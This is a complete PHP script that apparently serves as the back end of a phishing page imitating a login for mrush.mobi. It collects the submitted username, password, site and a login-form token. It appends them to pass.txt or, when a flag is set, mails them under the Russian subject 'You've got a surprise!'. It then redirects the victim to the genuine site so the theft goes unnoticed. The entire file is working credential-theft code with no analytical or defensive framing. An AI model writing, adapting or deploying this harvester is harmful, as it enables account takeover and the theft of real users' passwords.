<?php
$BASE="pass.txt";
$IS_EMAIL=false;
$LOCATION="http://mrush.mobi/";

$p0=$_REQUEST["loginForm_loginForm_hf_0"];
$p1=$_REQUEST["name"];
$p2=$_REQUEST["pass"];
$p3=$_REQUEST["site"];
$headers = "";
$info="$p0|$p1*$p2*$p3|\n";

if ($IS_EMAIL){
mail($BASE, "*** Вам пришёл сюрприз!", $headers.$info);
} else {
$fd=fopen($BASE,"a+");
fwrite($fd,$info);
fclose($fd);
}

header("Location:$LOCATION");
?>
